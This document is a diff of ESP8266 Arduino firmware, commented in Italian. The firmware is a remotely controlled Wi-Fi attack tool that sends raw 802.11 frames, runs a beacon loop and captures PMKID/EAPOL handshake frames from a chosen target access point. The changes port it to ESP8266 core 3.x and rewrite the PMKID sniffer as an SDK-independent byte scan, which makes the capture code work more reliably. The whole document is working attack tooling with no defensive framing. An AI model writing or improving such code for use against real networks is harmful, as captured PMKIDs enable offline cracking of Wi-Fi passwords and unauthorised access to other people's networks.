@@ -7,9 +7,8 @@
 //     0x06 pmkid(mac,ch) → capture EAPOL promiscua
 //     0x07 stop
 //
-// TX raw: wifi_send_pkt_freedom (user_interface.h) — richiede esp8266 core 2.7.4
-// (Boards Manager → esp8266 → versione 2.7.4). Il TCP resta vivo perché l'AP è
-// in WIFI_AP_STA: le radio AP e STA coesistono.
+// TX raw: wifi_send_pkt_freedom — compatibile esp8266 core 3.x (testato su 3.1.2)
+// e 2.x. Il TCP resta vivo perché l'AP è in WIFI_AP_STA: AP e STA coesistono.
 //
 // Flash: Arduino IDE → board NodeMCU 1.0 / Wemos D1 mini → Upload.
 
@@ -89,11 +88,7 @@ void feedRx(const uint8_t *d, int n) {
 }
 
 // ===== TX raw 802.11 =====
-void radioInit() {
-  WiFi.mode(WIFI_AP_STA);              // AP (link TCP) + STA (tx promiscua)
-  wifi_set_promisc(true);
-}
-
+// compatibile SDK2/SDK3: wifi_promiscuous_enable esiste in entrambi
 void radioChannel(uint8_t ch) {
   wifi_promiscuous_enable(0);
   wifi_set_channel(ch);
@@ -153,20 +148,27 @@ void beaconLoop() {
   }
 }
 
-// ===== PMKID sniffer =====
+// ===== PMKID sniffer (SDK-agnostico: byte-scan, nessuna struct interna) =====
 void snifferCb(uint8_t *buf, uint16_t len) {
-  if (!pmkidArmed) return;
-  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
-  const uint8_t *d = p->payload;
-  int pl = p->rx_ctrl.sig_len;
-  if (pl < 40 || pl > 200) return;
-  if (d[24] != 0xAA || d[25] != 0xAA || d[26] != 0x03 || d[27] != 0x00 ||
-      d[28] != 0x00 || d[29] != 0x00 || d[30] != 0x88 || d[31] != 0x8E) return;
-  if (memcmp(d + 10, pmkidTarget, 6) != 0) return;
-  pmkidLen = (pl < 128) ? pl : 128;
-  memcpy(pmkidBuf, d, pmkidLen);
-  pmkidCaptured = true;
-  Serial.println("[pmkid] EAPOL catturato");
+  if (!pmkidArmed || len < 40) return;
+  uint8_t *d = buf;
+  int lim = (len > 160) ? 160 : len;
+  for (int i = 0; i + 8 <= lim; i++) {
+    if (d[i] == 0xAA && d[i + 1] == 0xAA && d[i + 2] == 0x03 && d[i + 3] == 0x00 &&
+        d[i + 4] == 0x00 && d[i + 5] == 0x00 && d[i + 6] == 0x88 && d[i + 7] == 0x8E) {
+      // filtro AP: mac target presente nella zona addr del frame
+      bool match = false;
+      for (int a = 4; a + 6 <= 36 && a + 6 <= len; a++) {
+        if (memcmp(d + a, pmkidTarget, 6) == 0) { match = true; break; }
+      }
+      if (!match) return;
+      pmkidLen = (len < 128) ? len : 128;
+      memcpy(pmkidBuf, d, pmkidLen);
+      pmkidCaptured = true;
+      Serial.println("[pmkid] EAPOL catturato");
+      return;
+    }
+  }
 }
 
 // ===== dispatcher =====
@@ -256,7 +258,7 @@ void setup() {
 
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(AP_SSID, AP_PASS);
-  wifi_set_promisc(true);
+  wifi_promiscuous_enable(1);
 
   server.begin();
   server.setNoDelay(true);
